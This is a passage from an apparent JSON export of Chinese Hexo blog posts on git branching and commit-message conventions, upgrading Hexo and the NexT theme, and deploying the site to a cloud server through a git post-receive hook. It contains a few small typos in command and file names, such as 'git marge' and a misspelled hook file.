id=\"feature分支\"><a href=\"#feature分支\" class=\"headerlink\" title=\"feature分支\"></a>feature分支</h3><p>定义：从develop分支发起feature分支，通常是在开发一项新的软件功能的时候使用，最终合并回develop分支<br>命名：feature-开发人员-版本号<br>权限：开发人员从develop分支派生，并合并回develop分支<br>生命周期：开发一个新功能开始，完成新功能开发并合并回develop分支结束<br>补充说明：feature分支代码可以保存在开发者自己的代码库中而不强制提交到主代码库里</p>\n<h3 id=\"管理方式\"><a href=\"#管理方式\" class=\"headerlink\" title=\"管理方式\"></a>管理方式</h3><p>1、管理员在github或gitlab上建立master、develop分支<br>2、开发者从远程develop分支，拉取develop分支到本地<br>3、开发者从develop分支上建立自己的feature分支<br>4、开发者合并feature分支到develop分支，可删除自己的feature分支<br>5、管理员从develop分支派生出release分支<br>6、开发者从远程release分支，拉取release分支到本地<br>7、开发者在release分支上修复缺陷，并提交release分支<br>8、管理员合并release分支到develop分支和master分支，可删除release分支<br>9、开发者从master分支派生hotfix分支，并拉取hotfix分支到本地<br>10、开发者在hotfix分支上修复缺陷，提交hotfix分支，并提交merge request请求<br>11、管理员合并hotfix分支到master分支，可删除hotfix分支<br>12、同一产品的不同客户，可以在master分支上使用tag来标识客户的部署版本</p>\n<h2 id=\"四、常用操作命令\"><a href=\"#四、常用操作命令\" class=\"headerlink\" title=\"四、常用操作命令\"></a>四、常用操作命令</h2><p>新建本地分支：git branch &lt;分支名称&gt;<br>删除本地分支：git branch -D &lt;分支名称&gt;<br>合并本地分支：git marge &lt;要合并的分支&gt;<br>提交本地分支：git push &lt;远程主机&gt; &lt;本地分支&gt;:&lt;远程分支&gt;<br>查看本地分支：git branch<br>切换本地分支：git checkout &lt;分支名称&gt;<br>创建并切换分支：git checkout -b &lt;分支名称&gt;<br>拉取远程分支：git pull &lt;远程主机&gt; &lt;远程分支&gt;:&lt;本地分支&gt;<br>新建版本标签：git tag -a &lt;版本号&gt; -m ‘说明’<br>提交版本标签：git push &lt;远程主机&gt; –tags 或者 git push &lt;远程主机&gt; &lt;版本号&gt;<br>查看标签版本：git tag<br>获取标签版本：git checkout &lt;版本号&gt;</p>\n<h2 id=\"五、Git-commit-注释规范\"><a href=\"#五、Git-commit-注释规范\" class=\"headerlink\" title=\"五、Git commit 注释规范\"></a>五、Git commit 注释规范</h2><p>使用标准的提交注释格式后，我们可以：</p>\n<ul>\n<li>让评审人快速了解本次变更的意图，评判内容与意图的相符程度。</li>\n<li>通过脚本自动生成变更日志（CHANGELOG）</li>\n<li>识别或过滤不重要的代码变更，例如只对代码格式进行修订的那些</li>\n<li>当浏览提交历史时，可以快速得到更多且更有用的信息</li>\n</ul>\n<p>提交注释格式如下所示。它由三个段落组成，分别是：主题行，内容体和脚注，并由一个空行分隔。</p>\n<img src=\"/2021/12/29/Git%E8%BD%AF%E4%BB%B6%E7%89%88%E6%9C%AC%E7%AE%A1%E7%90%86%E8%A6%81%E7%82%B9/commit-message-example.png\" class=\"\">\n\n<h3 id=\"主题行-Header\"><a href=\"#主题行-Header\" class=\"headerlink\" title=\"主题行 Header &#x3D; &lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;\"></a>主题行 Header &#x3D; <code>&lt;type&gt;(&lt;scope&gt;): &lt;subject&gt;</code></h3><h4 id=\"type\"><a href=\"#type\" class=\"headerlink\" title=\"type\"></a>type</h4><p>type用于说明 commit 的类别，只允许使用下面8个标识:</p>\n<ul>\n<li>br: 此项特别针对bug号，用于向测试反馈bug列表的bug修改情况</li>\n<li>feat：新功能（feature）</li>\n<li>fix：修补bug</li>\n<li>docs：文档（documentation）</li>\n<li>style： 格式（不影响代码运行的变动）</li>\n<li>refactor：重构（即不是新增功能，也不是修改bug的代码变动）</li>\n<li>test：增加测试</li>\n<li>chore：构建过程或辅助工具的变动</li>\n<li>revert: feat(pencil): add ‘graphiteWidth’ option (撤销之前的commit)</li>\n</ul>\n<h4 id=\"scope\"><a href=\"#scope\" class=\"headerlink\" title=\"scope\"></a>scope</h4><p>scope用于说明 commit 影响的范围，比如数据层、控制层、视图层等等，视项目不同而不同。</p>\n<h4 id=\"subject\"><a href=\"#subject\" class=\"headerlink\" title=\"subject\"></a>subject</h4><p>subject是 commit 目的的简短描述，不超过50个字符。<br>以动词开头，使用第一人称现在时，比如change，而不是changed或changes<br>第一个字母小写，结尾不加句号（.）</p>\n<p>举几个简单的例子：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"code\"><pre><span class=\"line\">feat(compiler-cli): propagate standalone flag to runtime (#44973)</span><br><span class=\"line\">fix(router): merge interited resolved data and static data (#45276)</span><br><span class=\"line\">release: cut the v14.0.0-next.9 release (#45442)</span><br><span class=\"line\">refactor(common): removed TODO no longer considered necessary (#43378) </span><br><span class=\"line\">docs: remove Angular 9 from support table (#43350) </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"内容体-Body\"><a href=\"#内容体-Body\" class=\"headerlink\" title=\"内容体 Body\"></a>内容体 Body</h3><p>是对本次 commit 的详细描述，可以分成多行。</p>\n<p>与 summary 使用的语句形式一样，祈使句、现在时，用于解释为什么要做这样的改动，可以与上一个版本的代码做对比，来说明变化的影响。</p>\n<h3 id=\"脚注-Footer\"><a href=\"#脚注-Footer\" class=\"headerlink\" title=\"脚注 Footer\"></a>脚注 Footer</h3><p>用来描述重大不兼容的改变或者指引到相应的 issues 列表等</p>\n<p>具体可以参见<a href=\"https://github.com/angular/angular/commits/master\">Angular Github的示例</a></p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://git-scm.com/book/zh/v2\">Git官方技术白皮书</a></li>\n<li><a href=\"https://www.liaoxuefeng.com/wiki/896043488029600\">廖雪峰的Git基础教程</a></li>\n<li><a href=\"https://www.iteye.com/blog/juvenshun-376422\">Maven版本管理的最佳实践</a></li>\n<li><a href=\"https://code.visualstudio.com/Docs/editor/versioncontrol\">Vscode的版本管理插件</a></li>\n<li><a href=\"https://haicoder.net/mysql/mysql-version.html\">MySQL的版本管理</a></li>\n<li><a href=\"http://jdk.java.net/archive/\">Oracle OpenJDK的历史版本下载页</a></li>\n<li><a href=\"https://helloyyk.com/34.html\">Git Commit Message规范 - Angular</a></li>\n<li><a href=\"https://www.continuousdelivery20.com/blog/cr-good-commit-message/\">如何写好提交注释</a></li>\n</ul>\n"},{"title":"HEXO 5.4 & NEXT 8.8.2 版本升级记录","url":"/2021/12/19/HEXO-5-4-NEXT-8-8-2-%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7%E8%AE%B0%E5%BD%95/","content":"<p>原来HEXO的版本是3.6，都是几年前的老东西了，最近总是提示<code>highlight.js</code>的旧版本存在安全漏洞，需要升级到10以上版本，此外由于node、next-theme-next等版本都存在不少问题，周末下定决心做一次版本升级。</p>\n<h2 id=\"一、目标版本环境\"><a href=\"#一、目标版本环境\" class=\"headerlink\" title=\"一、目标版本环境\"></a>一、目标版本环境</h2><ul>\n<li><code>node 12.22.8</code>: 最新版本v17，推荐LTS版本v16.13.1，但是由于兼容性问题，本次采用v12的最新补丁版本。<br>  另一方面，HEXO官方要求：Node.js 版本需不低于 10.13，建议使用 Node.js 12.0 及以上版本</li>\n<li><code>hexo 5.4</code>: 最新版本，2021年2月发布；相应hexo-cli的版本是4.3.0</li>\n<li><code>hexo-theme-next 8.8.2</code>: 最新版本的用户主题</li>\n</ul>\n<figure class=\"highlight console\"><table><tr><td class=\"code\"><pre><span class=\"line\">JiandeiMac:nokiam9.github.io sj$ hexo -v</span><br><span class=\"line\">INFO  Validating config</span><br><span class=\"line\">INFO  ==================================</span><br><span class=\"line\">  ███╗   ██╗███████╗██╗  ██╗████████╗</span><br><span class=\"line\">  ████╗  ██║██╔════╝╚██╗██╔╝╚══██╔══╝</span><br><span class=\"line\">  ██╔██╗ ██║█████╗   ╚███╔╝    ██║</span><br><span class=\"line\">  ██║╚██╗██║██╔══╝   ██╔██╗    ██║</span><br><span class=\"line\">  ██║ ╚████║███████╗██╔╝ ██╗   ██║</span><br><span class=\"line\">  ╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝   ╚═╝</span><br><span class=\"line\">========================================</span><br><span class=\"line\">NexT version 8.8.2</span><br><span class=\"line\">Documentation: https://theme-next.js.org</span><br><span class=\"line\">========================================</span><br><span class=\"line\">hexo: 5.4.0</span><br><span class=\"line\">hexo-cli: 4.3.0</span><br><span class=\"line\">os: darwin 17.7.0 10.13.6</span><br><span class=\"line\"></span><br><span class=\"line\">node: 12.22.8</span><br><span class=\"line\">v8: 7.8.279.23-node.56</span><br><span class=\"line\">uv: 1.40.0</span><br><span class=\"line\">zlib: 1.2.11</span><br><span class=\"line\">brotli: 1.0.9</span><br><span class=\"line\">ares: 1.18.1</span><br><span class=\"line\">modules: 72</span><br><span class=\"line\">nghttp2: 1.41.0</span><br><span class=\"line\">napi: 8</span><br><span class=\"line\">llhttp: 2.1.4</span><br><span class=\"line\">http_parser: 2.9.4</span><br><span class=\"line\">openssl: 1.1.1m</span><br><span class=\"line\">cldr: 37.0</span><br><span class=\"line\">icu: 67.1</span><br><span class=\"line\">tz: 2019c</span><br><span class=\"line\">unicode: 13.0</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"二、hexo的升级\"><a href=\"#二、hexo的升级\" class=\"headerlink\" title=\"二、hexo的升级\"></a>二、hexo的升级</h2><p>要升级就彻底一点，把HEXO的全部依赖都升级到最新版本，参考以下步骤吧。</p>\n<h3 id=\"1-npm的全局软件更新\"><a href=\"#1-npm的全局软件更新\" class=\"headerlink\" title=\"1. npm的全局软件更新\"></a>1. npm的全局软件更新</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 清理NPM缓存</span></span><br><span class=\"line\">$ npm cache clean -f</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 全局安装版本检测、版本升级工具</span></span><br><span class=\"line\">$ npm install -g npm-check</span><br><span class=\"line\">$ npm install -g npm-upgrade</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 全局检测哪些模块可以升级，这里可以根据打印的提示信息，手动安装最新版本的模块</span></span><br><span class=\"line\">$ npm-check -g</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 全局更新模块</span></span><br><span class=\"line\">$ npm update -g</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 全局安装或更新Hexo的最新版本</span></span><br><span class=\"line\">$ npm install --global hexo</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-hexo当前目录的软件更新\"><a href=\"#2-hexo当前目录的软件更新\" class=\"headerlink\" title=\"2. hexo当前目录的软件更新\"></a>2. hexo当前目录的软件更新</h3><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 进入博客的根目录</span></span><br><span class=\"line\">$ <span class=\"built_in\">cd</span> /blog-root</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 检测Hexo哪些模块可以升级</span></span><br><span class=\"line\">$ npm-check</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 删除package-lock.json</span></span><br><span class=\"line\"><span class=\"comment\"># rm -rf package-lock.json</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 更新package.json</span></span><br><span class=\"line\">$ npm-upgrade</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 删除整个模块目录，这样可以避免很多坑</span></span><br><span class=\"line\">$ <span class=\"built_in\">rm</span> -rf node_modules</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 更新Hexo的模块</span></span><br><span class=\"line\">$ npm update --save</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 若出现依赖的问题，用以下命令检查一下，然后把报错的统一修复一下即可</span></span><br><span class=\"line\">$ npm audix</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 或者强制更新</span></span><br><span class=\"line\">$ npm update --save --force</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-检查方法\"><a href=\"#3-检查方法\" class=\"headerlink\" title=\"3. 检查方法\"></a>3. 检查方法</h3><p>在上述步骤完成后，<code>package.json</code>将成为以下版本信息：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">&quot;name&quot;:</span> <span class=\"string\">&quot;hexo-site&quot;</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;version&quot;:</span> <span class=\"string\">&quot;0.0.0&quot;</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;private&quot;:</span> <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;hexo&quot;:</span> &#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;version&quot;:</span> <span class=\"string\">&quot;5.4.0&quot;</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"attr\">&quot;dependencies&quot;:</span> &#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;chokidar&quot;:</span> <span class=\"string\">&quot;^3.5.2&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;eslint&quot;:</span> <span class=\"string\">&quot;^8.5.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo&quot;:</span> <span class=\"string\">&quot;^5.4.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-deployer-git&quot;:</span> <span class=\"string\">&quot;^3.0.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-auto-excerpt&quot;:</span> <span class=\"string\">&quot;^1.1.2&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-generator-archive&quot;:</span> <span class=\"string\">&quot;^1.0.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-generator-category&quot;:</span> <span class=\"string\">&quot;^1.0.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-generator-index&quot;:</span> <span class=\"string\">&quot;^2.0.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-generator-search&quot;:</span> <span class=\"string\">&quot;^2.4.3&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-generator-searchdb&quot;:</span> <span class=\"string\">&quot;^1.4.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-generator-tag&quot;:</span> <span class=\"string\">&quot;^1.0.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-renderer-ejs&quot;:</span> <span class=\"string\">&quot;^2.0.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-renderer-marked&quot;:</span> <span class=\"string\">&quot;^4.1.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-renderer-stylus&quot;:</span> <span class=\"string\">&quot;^2.0.1&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-renderer-swig&quot;:</span> <span class=\"string\">&quot;^1.1.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-server&quot;:</span> <span class=\"string\">&quot;^2.0.0&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo-theme-next&quot;:</span> <span class=\"string\">&quot;^8.8.2&quot;</span></span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在其它开发机上，也可以依据已更新成功的<code>package.json</code>，直接通过<code>npm install</code>进行升级。</p>\n<h2 id=\"三、hexo-theme-next的升级\"><a href=\"#三、hexo-theme-next的升级\" class=\"headerlink\" title=\"三、hexo-theme-next的升级\"></a>三、hexo-theme-next的升级</h2><p>由于历史原因，next有3个不同的Github源码地址。<br>NexT 8.x 相比旧版，技术架构有重大变化，无法做到平滑升级，建议做好备份后全新安装，然后重新配置。</p>\n<table>\n<thead>\n<tr>\n<th>对比项目</th>\n<th>旧版</th>\n<th>新版</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>安装方式</td>\n<td>git</td>\n<td>npm、git</td>\n</tr>\n<tr>\n<td>安装目录</td>\n<td>themes&#x2F;next</td>\n<td>npm:node_modules&#x2F;hexo-theme-next <br> git:themes&#x2F;next</td>\n</tr>\n<tr>\n<td>模板格式</td>\n<td>swig模板</td>\n<td>nunjucks引擎</td>\n</tr>\n<tr>\n<td>字体图标</td>\n<td>Font Awesome 4.x</td>\n<td>Font Awesome 5.x</td>\n</tr>\n<tr>\n<td>配置文件</td>\n<td>hexo&#x2F;source&#x2F;_data&#x2F;next.yml</td>\n<td>hexo&#x2F;_config.next.yml</td>\n</tr>\n<tr>\n<td>源码地址</td>\n<td>v5:<a href=\"https://github.com/iissnan/hexo-theme-next\">https://github.com/iissnan/hexo-theme-next</a> <br> v6 &amp; v7:<a href=\"https://github.com/theme-next/hexo-theme-next\">https://github.com/theme-next/hexo-theme-next</a></td>\n<td>v8:<a href=\"https://github.com/next-theme/hexo-theme-next\">https://github.com/next-theme/hexo-theme-next</a></td>\n</tr>\n</tbody></table>\n<p>原来的安装方法是通过<code>git clone</code>，安装点位于<code>theme/next</code>目录；<br>现在改为<code>npm install hexo-theme-next</code>, 安装点位于<code>node_modules/hexo-theme-next</code>。</p>\n<p>原来的参数配置是：全局配置文件<code>_config.yml</code> + 主题配置文件<code>theme/next/_config.yml</code>。<br>而在next 8.8.2，主题配置文件改为<code>_config.next.yml</code>（从<code>theme/next/_config.yml</code>拷贝，并改名而来）。</p>\n<p>总体而言，npm方式更为优雅，而且目录结构得到精简。</p>\n<h2 id=\"四、如何在ECS云服务器上部署HEXO静态页面\"><a href=\"#四、如何在ECS云服务器上部署HEXO静态页面\" class=\"headerlink\" title=\"四、如何在ECS云服务器上部署HEXO静态页面\"></a>四、如何在ECS云服务器上部署HEXO静态页面</h2><p>Github提供了标准的用户主页展示功能，通过CI&#x2F;CD为HEXO的静态页面提供部署环境，默认主页域名是<code>https://xxxx.github.io</code>。<br>但是，我们也可以利用Git的钩子功能，将HEXO静态页面部署在自己的云服务器上，主要包含以下步骤：</p>\n<h3 id=\"1-准备工作\"><a href=\"#1-准备工作\" class=\"headerlink\" title=\"1. 准备工作\"></a>1. 准备工作</h3><ul>\n<li>独立的站点域名，并设置DNS指向ECS服务器</li>\n<li>在ECS服务器上安装git、nginx</li>\n<li>在ECS服务器上启动Nginx服务，并将该域名的root目录设为<code>/var/www</code></li>\n<li>在ECS服务器上添加开发机的公匙（<code>$HOME/.ssh/authorized_keys</code>），为开发机提供root用户的免密登录</li>\n</ul>\n<h3 id=\"2-ECS服务器上设置Git-Hooks\"><a href=\"#2-ECS服务器上设置Git-Hooks\" class=\"headerlink\" title=\"2. ECS服务器上设置Git Hooks\"></a>2. ECS服务器上设置Git Hooks</h3><p>基本原理：在ECS服务器部署一个git仓库，作为hexo部署(deploy)的远端git仓库，每次提交时自动触发post-receive事件，用于更新nginx的静态页面。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 创建一个远端仓库</span></span><br><span class=\"line\">git init --bare /root/blog.git</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 创建一个钩子</span></span><br><span class=\"line\"><span class=\"built_in\">cat</span> &gt; /root/blog.git/hooks/post-receice &lt;&lt;- <span class=\"string\">EOF</span></span><br><span class=\"line\"><span class=\"string\">#!/bin/sh</span></span><br><span class=\"line\"><span class=\"string\">git --work-tree=/var/www --git-dir=/root/blog.git checkout -f</span></span><br><span class=\"line\"><span class=\"string\">EOF</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 添加可执行权限</span></span><br><span class=\"line\"><span class=\"built_in\">chmod</span> +x /root/blog.git/hooks/post-receive </span><br></pre></td></tr></table></figure>\n\n<h3 id=\"3-开发机上部署hexo-depoly服务\"><a href=\"#3-开发机上部署hexo-depoly服务\" class=\"headerlink\" title=\"3. 开发机上部署hexo-depoly服务\"></a>3. 开发机上部署hexo-depoly服务</h3><p>Hexo的全局配置文件<code>_config.yml</code>中，配置hexo-depoly服务，示例：</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Deployment</span></span><br><span class=\"line\"><span class=\"comment\">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class=\"line\"><span class=\"attr\">deploy:</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">type:</span> <span class=\"string\">git</span></span><br><span class=\"line\">    <span class=\"attr\">repository:</span> <span class=\"string\">https://github.com/xxx/xxx.github.io</span></span><br><span class=\"line\">    <span class=\"attr\">branch:</span> <span class=\"string\">master</span></span><br><span class=\"line\">  <span class=\"bullet\">-</span> <span class=\"attr\">type:</span> <span class=\"string\">git</span></span><br><span class=\"line\">    <span class=\"attr\">repository:</span> <span class=\"string\">root@ecs.com:/root/blog.git</span></span><br><span class=\"line\">    <span class=\"attr\">branch:</span> <span class=\"string\">master</span></span><br></pre></td></tr></table></figure>\n\n<p>完成以上工作后，我们运行<code>hexo d</code>时将触发上述2个服务，远端ECS服务器在接受到git推送信息后，触发post-receive钩子并更新<code>/var/root</code>目录下的静态页面。<br>其实，Github的用户主页更新服务也是同样的原理。</p>\n<h2 id=\"五、常见问题\"><a href=\"#五、常见问题\" class=\"headerlink\" title=\"五、常见问题\"></a>五、常见问题</h2><h3 id=\"1-首页的“节选”功能失效\"><a href=\"#1-首页的“节选”功能失效\" class=\"headerlink\" title=\"1. 首页的“节选”功能失效\"></a>1. 首页的“节选”功能失效</h3><p>原来是通过next配置文件的<code>excerpt_description: true</code>，但next新版本剔除了这个功能，而是由<code>hexo-auto-concerpt</code>插件实现此功能。<br>解决方案：安装<code>npm install hexo-auto-concerpt</code>，或者修改<code>package.json</code>后自动安装。</p>\n<h3 id=\"2-NodeJS为什么要选择版本12\"><a href=\"#2-NodeJS为什么要选择版本12\" class=\"headerlink\" title=\"2. NodeJS为什么要选择版本12\"></a>2. NodeJS为什么要选择版本12</h3><p>NodeJS 从 12.0.0 才开始支持函数 String.matchAll()，如果 NodeJS 的版本低于 12.0.0，那么执行 Hexo 的构建命令就会出现错误<br>解决方案：v12是node的最佳版本</p>\n<h3 id=\"3-external-link配置方法有变化\"><a href=\"#3-external-link配置方法有变化\" class=\"headerlink\" title=\"3. external_link配置方法有变化\"></a>3. <code>external_link</code>配置方法有变化</h3><figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Deprecated</span></span><br><span class=\"line\"><span class=\"attr\">external_link:</span> <span class=\"literal\">true</span><span class=\"string\">|false</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># New option</span></span><br><span class=\"line\"><span class=\"attr\">external_link:</span></span><br><span class=\"line\">  <span class=\"attr\">enable:</span> <span class=\"literal\">true</span> <span class=\"comment\"># Open external links in new tab</span></span><br><span class=\"line\">  <span class=\"attr\">field:</span> <span class=\"string\">site</span> <span class=\"comment\"># Apply to the whole site</span></span><br><span class=\"line\">  <span class=\"attr\">exclude:</span> <span class=\"string\">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"4-Next更新后，头部菜单或尾部Page按钮出现乱码\"><a href=\"#4-Next更新后，头部菜单或尾部Page按钮出现乱码\" class=\"headerlink\" title=\"4. Next更新后，头部菜单或尾部Page按钮出现乱码\"></a>4. Next更新后，头部菜单或尾部Page按钮出现乱码</h3><p>凡涉及到引用 Font Awesome 的地方，图标名和调用方式要更新，比如旧版填写 home，新版要改为 fa fa-home，否则图标会显示乱码</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 旧版</span></span><br><span class=\"line\"><span class=\"attr\">menu:</span></span><br><span class=\"line\"><span class=\"attr\">home:</span> <span class=\"string\">/</span> <span class=\"string\">||</span> <span class=\"string\">home</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 新版</span></span><br><span class=\"line\"><span class=\"attr\">menu:</span></span><br><span class=\"line\"><span class=\"attr\">home:</span> <span class=\"string\">/</span> <span class=\"string\">||</span> <span class=\"string\">fa</span> <span class=\"string\">fa-home</span></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"5-LocalSearch-失效的问题\"><a href=\"#5-LocalSearch-失效的问题\" class=\"headerlink\" title=\"5. LocalSearch 失效的问题\"></a>5. LocalSearch 失效的问题</h3><p>开始你的Blog搜索功能还是正常的，搜索出结果一直在转圈圈等待，或者 搜索功能能搜索但是不能跳转过去，随着添加了几篇文章以后，搜索就不正常了，访问你的博客 http:&#x2F;&#x2F;你的博客域名&#x2F;search.xml&#96; 的时候，提示有存在不可解析的字节的错误，大致如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">This page contains the following errors:error on line 66 at column 35: Input is not proper UTF-8, indicate encoding !</span><br><span class=\"line\">Bytes: 0x08 0xE8 0xAF 0x84Below is a rendering of the page up to the first error.</span><br></pre></td></tr></table></figure>\n\n<p>此时，是因为你的xml解析有问题，换成json来解析即可，<br>解决方案：编辑你的站点配置文件<code>_config.yml</code>,找到搜索的地方 把 Search的xml解析改成json解析</p>\n<h3 id=\"6-highlight-js的版本9存在安全漏洞，频繁出现告警信息\"><a href=\"#6-highlight-js的版本9存在安全漏洞，频繁出现告警信息\" class=\"headerlink\" title=\"6. highlight.js的版本9存在安全漏洞，频繁出现告警信息\"></a>6. highlight.js的版本9存在安全漏洞，频繁出现告警信息</h3><p>全部完成<code>npm-check</code>和<code>npm-upgade</code>之后，问题完美解决。</p>\n<hr>\n<h2 id=\"参考文献\"><a href=\"#参考文献\" class=\"headerlink\" title=\"参考文献\"></a>参考文献</h2><ul>\n<li><a href=\"https://theme-next.js.org/docs/getting-started/upgrade.html\">NexT Compatibility with Hexo Version</a></li>\n<li><a href=\"https://www.imczw.com/post/tech/hexo5-next8-updated.html\">Hexo-5.x 与 NexT-8.x 跨版本升级</a></li>\n<li><a href=\"https://www.techgrow.cn/posts/d1f06120.html\">Hexo 与 Next 版本升级教程</a></li>\n<li><a href=\"https://www.jianshu.com/p/ccb61a511f9a\">Hexo NexT 主题的简易使用</a></li>\n<li><a href=\"https://www.yousazoe.top/archives/c12c9c40.html\">Hexo-NexT 博客使用插件总结</a></li>\n<li><a href=\"https://developer.aliyun.com/article/775005\">记录Hexo部署到阿里云服务器全过程</a></li>\n</ul>\n"},{"title":"HEXO 6.3 & NEXT 8.18.2 版本升级记录","url":"/2023/10/18/HEXO-6-3-NEXT-8-18-2-%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7%E8%AE%B0%E5%BD%95/","content":"<p>原本 HEXO v5.4.2 基于 node v12 版本，但最近个别组件出现安全告警要求强制升级，但新版本的组件依赖 node v14 版本，只好再次升级。<br><img src=\"/2023/10/18/HEXO-6-3-NEXT-8-18-2-%E7%89%88%E6%9C%AC%E5%8D%87%E7%BA%A7%E8%AE%B0%E5%BD%95/version.jpg\" alt=\"version\"></p>\n<p>其中一个开发设备是古老的 Mac 一体机，通过 node 官网下载 v18 的 pkg 安装包，运行异常退出，核查原因是操作系统版本是 High Sierra 10.13（最后一个支持32位App的版本，告别了僵尸大战！），被迫升级到 Catalina 10.15，经过好几番折腾，最后完成情况如下：</p>\n<p>node：最新版本 v20，LTS 版本 v18<br>npm：9.8.1<br>Hexo：6.3<br>Next：8.18.2</p>\n<h2 id=\"package-json-配置信息\"><a href=\"#package-json-配置信息\" class=\"headerlink\" title=\"package.json 配置信息\"></a>package.json 配置信息</h2><p>删除依赖库目录 <code>node_modules/</code> ，修改安装配置文件，然后重新<code>npm install</code></p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"attr\">&quot;name&quot;:</span> <span class=\"string\">&quot;hexo-site&quot;</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;version&quot;:</span> <span class=\"string\">&quot;0.0.0&quot;</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;private&quot;:</span> <span class=\"literal\">true</span>,</span><br><span class=\"line\">  <span class=\"attr\">&quot;scripts&quot;:</span> &#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;build&quot;:</span> <span class=\"string\">&quot;hexo generate&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;clean&quot;:</span> <span class=\"string\">&quot;hexo clean&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;deploy&quot;:</span> <span class=\"string\">&quot;hexo deploy&quot;</span>,</span><br><span class=\"line\">    <span class=\"attr\">&quot;server&quot;:</span> <span class=\"string\">&quot;hexo server&quot;</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"attr\">&quot;hexo&quot;:</span> &#123;</span><br><span class=\"line\">    <span class=\"attr\">&quot;version&quot;:</span> <span class=\"string\">&quot;6.3.0&quot;</span></span><br><span class=\"line\">  &#125;,</span><br><span class=\"line\">  <span class=\"attr\">&quot;dependencies&quot;:</span> &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;@next-theme/plugins&quot;</span><span class=\"string\">:</span> <span class=\"string\">&quot;^8.18.2&quot;</span>,           <span class=\"comment\"># Next主题的对应插件</span></span><br><span class=\"line\">    <span class=\"attr\">&quot;hexo&quot;:</span> <span class=\"string\">&quot;^6.3.0&quot;</span>,                           <span class=\"comment\"># 主服务</span></span><br><span class=\"line\">    <span 